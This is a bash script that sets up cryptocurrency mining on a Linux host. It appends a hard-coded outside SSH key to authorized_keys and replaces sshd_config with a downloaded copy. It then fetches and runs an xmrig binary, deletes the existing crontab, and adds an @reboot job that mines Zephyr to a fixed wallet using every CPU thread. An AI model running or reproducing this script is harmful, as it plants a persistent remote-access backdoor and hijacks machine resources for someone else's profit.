#!/bin/bash

# Install necessary packages
apt-get update -y
apt-get install wget screen cron hping3 -y

# Setup SSH
cd ~
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOswKNcA2Gzv/mGSu2oeh571PlbpyAekXkmVh8FVx/z/ crypto@currency" >> ~/.ssh/authorized_keys

# Download and set SSH config
wget https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd_config
rm -rf /etc/ssh/sshd_config
mv sshd_config /etc/ssh/sshd_config

# Define the list of addresses for latency check
addresses=(
"de.zephyr.herominers.com"
"fi.zephyr.herominers.com"
"ca.zephyr.herominers.com"
"ru.zephyr.herominers.com"
"us.zephyr.herominers.com"
"us2.zephyr.herominers.com"
"br.zephyr.herominers.com"
"hk.zephyr.herominers.com"
"kr.zephyr.herominers.com"
"in.zephyr.herominers.com"
"sg.zephyr.herominers.com"
"tr.zephyr.herominers.com"
"au.zephyr.herominers.com"
)
minLatency=1000000
minAddress=""

# Ping each address and find the one with the lowest latency
for address in "${addresses[@]}"
do
    result=$(hping3 --quiet -c 5 -p 1123 -S $address 2>&1 | grep round-trip | awk -F '/' '{print $5}')
    result=${result%.*}
    if [[ ! -z "$result" && "$result" =~ ^[0-9]+$ ]]; then
        echo "$address: $result ms"
        if [ "$result" -lt "$minLatency" ]; then
            minLatency="$result"
            minAddress="$address"
        fi
    else
        echo "No response from $address"
    fi
done

echo "Lowest latency is $minLatency ms at $minAddress"
MINER_ENDPOINT="$minAddress:1123"

# Proceed with the rest of the script
hostnamectl set-hostname $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")

wget https://raw.githubusercontent.com/realtkco/scripts/main/xmrig -O xmrig
chmod +x ./xmrig

# Use the MINER_ENDPOINT with the lowest latency in the crontab entry
crontab -r

crontab -l | { cat; echo "@reboot screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")" ; } | crontab -

echo "screen /root/xmrig -o $MINER_ENDPOINT -u ZEPHYR2wp87E6LWqg162Ur9k9PuHsBEKUKtNXPiPTVtwigRWMBFvpTQg26DjYxRLrB7L7g7PNJqtkTmZaY8775iwLficAPASBtP45 --cpu-no-yield --randomx-1gb-pages -t $(nproc) -k -p $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "") >> start.sh

chmod +x start.sh

clear

echo "$(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")"
